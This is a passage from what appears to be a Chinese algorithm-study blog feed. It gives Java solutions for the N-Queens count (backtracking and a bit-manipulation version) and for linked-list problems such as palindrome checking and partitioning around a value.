title="N皇后问题"></a>N皇后问题</h2><p>在N*N的棋盘上要摆N个皇后，要求任何两个皇后不同行、不同列， 也不在同一条斜线上</p><p>给定一个整数n，返回n皇后的摆法有多少种</p><p>n=1，返回1</p><p>n=2或3，2皇后和3皇后问题无论怎么摆都不行，返回0</p><p>n=8，返回92</p><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>对N*N棋盘进行深度优先遍历，第一行选一个位置放一个皇后，进入下一行，选一个位置放一个皇后，并且保证与前面放的皇后不重合</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">nQueens</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> records <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> records<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 当前在第i行，records[m] = n 表示第m行的皇后放在第n列</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> records<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 0到n-1行完成放皇后的操作，说明n*n的棋盘完成摆放，返回1即为1个n皇后的摆法</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">// 尝试每一列</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isValid</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">,</span> records<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            records<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>            res <span class="token operator">+=</span> <span class="token function">process</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> records<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// i行j列放皇后是否合适</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> records<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>m<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">==</span> j <span class="token operator">||</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-</span> j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>m <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-0-位运算优化"><a href="#2-0-位运算优化" class="headerlink" title="2.0 位运算优化"></a>2.0 位运算优化</h3><p>假设为8皇后，则设立限制为前32-8位为0，后8位为1 （32是指不能超过32皇后）</p><p>存在三个数字，分别为列限制，左斜线限制，右斜线限制</p><p>从第0行，放在第几列，则把列限制的哪一位置1，然后左斜线限制的该位的左一位置1，右斜线限制的该位的右一位置1，</p><p>假设列限制为    0000 1 000，</p><p>则左斜线限制为0001 0 000，</p><p>右斜线限制为    0000 0 100</p><p>那么第1行，结合已有的三个限制（即或运算），将所有限制结合在一个数上，即为000 111 00，将该数取反然后和初始的限制 32-8 个0 8个1 做与运算，则为32-8 个0 111 000 11，所以1即为可以放皇后的位置，通过每次取得最右侧的1，然后继续递归，将三个限制做处理，然后传递到下一层，首先列限制即为将原先的列限制和取得的最右侧的1做或运算，左斜线限制为将原先的左斜线限制和取得的最右侧的1做或运算，然后左移一位，右斜线限制为将原先的右斜线限制和取得的最右侧的1做或运算，然后右移一位</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process2</span><span class="token punctuation">(</span><span class="token keyword">int</span> limit<span class="token punctuation">,</span> <span class="token keyword">int</span> colLimit<span class="token punctuation">,</span> <span class="token keyword">int</span> leftDiaLimit<span class="token punctuation">,</span> <span class="token keyword">int</span> rightDiaLimit<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>limit <span class="token operator">==</span> colLimit<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> positions <span class="token operator">=</span> limit <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>colLimit<span class="token operator">|</span>leftDiaLimit<span class="token operator">|</span>rightDiaLimit<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>positions <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> positions <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>positions<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        positions <span class="token operator">=</span> positions <span class="token operator">-</span> mostRight<span class="token punctuation">;</span>        res <span class="token operator">+=</span> <span class="token function">process2</span><span class="token punctuation">(</span>limit<span class="token punctuation">,</span> colLimit<span class="token operator">|</span>mostRight<span class="token punctuation">,</span> <span class="token punctuation">(</span>leftDiaLimit<span class="token operator">|</span>mostRight<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>rightDiaLimit<span class="token operator">|</span>mostRight<span class="token punctuation">)</span><span class="token operator">>>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">nQueens2</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> n <span class="token operator">></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> limit <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process2</span><span class="token punctuation">(</span>limit<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x02</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x02/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x02/</url>
      
        <content type="html"><![CDATA[<p>【链表，二叉树，树形DP，Morris遍历，图】</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><blockquote><p>链表问题一定要考虑边界情况，避免出现null还继续引用next节点</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> next<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        value <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x01-判断回文"><a href="#0x01-判断回文" class="headerlink" title="0x01 判断回文"></a>0x01 判断回文</h3><p>给定单链表头结点head，判断一个链表是否为回文</p><blockquote><p>1-&gt;2-&gt;1 true</p><p>1-&gt;2-&gt;2-&gt;1 true</p></blockquote><h4 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h4><p>遍历单链表，压入栈，然后一个一个弹出，与单链表比对，额外空间复杂度O(n)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome1</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">!=</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h4><p>找到链表中间，然后开始压入栈，这样只需要一半空间，O(n/2)</p><p>那么怎么找到中间位置，利用快慢指针，即从头建立两个指针，一个每次走2步，一个每次走1步，当快指针走到结尾，那么满指针就走到中间了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">!=</span>slow<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>同样利用快慢指针，慢指针到达中间时，将中间的这个节点的next指到null，然后原来的next的next指到这个中间的节点，依次逆序过来，完成之后，开始一一比对，这样的空间复杂度O(1)，不要忘记最后将右边一半恢复</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome3</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 逆序</span>    <span class="token class-name">Node</span> par <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> curNext<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>slow <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        curNext <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        slow<span class="token punctuation">.</span>next <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> slow<span class="token punctuation">;</span>        slow <span class="token operator">=</span> curNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> tail <span class="token operator">=</span> par<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> res <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token comment">// 比较值</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>par<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">!=</span> par<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        par <span class="token operator">=</span> par<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整回来</span>    par <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>tail <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        curNext <span class="token operator">=</span> tail<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        tail<span class="token punctuation">.</span>next <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> tail<span class="token punctuation">;</span>        tail <span class="token operator">=</span> curNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-链表的荷兰国旗问题"><a href="#0x02-链表的荷兰国旗问题" class="headerlink" title="0x02 链表的荷兰国旗问题"></a>0x02 链表的荷兰国旗问题</h3><p>将单链表按某值划分为左边小，中间相等，右边大的形式</p><h4 id="1-0-1"><a href="#1-0-1" class="headerlink" title="1.0"></a>1.0</h4><p>将链表放到辅助Node数组，于是变成了荷兰国旗问题，空间复杂度O(n)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">lessEqualMore1</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        len<span class="token operator">++</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    cur<span class="token operator">=</span>head<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cur<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> lessArea <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> moreArea <span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>moreArea<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">&lt;</span> value<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nodes<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">,</span> <span class="token operator">++</span>lessArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">></span> value<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nodes<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">--</span>moreArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodes<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    nodes<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> nodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-1"><a href="#2-0-1" class="headerlink" title="2.0"></a>2.0</h4><p>只需要六个变量，小于区域的头节点LH，尾节点LT，等于区域的头节点EH，尾节点ET，大于区域的头节点MH，尾节点MT，遍历单链表，第一次遇到小于的，就将LH和LT都指向它，第二次遇到小于的，就将LT的next指向它，然后LT指向它，其它区域同样，遍历完成之后，将SH、ST、EH、ET、MH、MT依次连接，同时注意空指针的情况，即有可能不存在小于区域，或者其它区域，导致没有next节点，如果不处理，则会报出异常</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">lessEqualMore2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> LH <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> LT <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> EH <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> ET <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> MH <span class="token operator">=</span> <span class="token 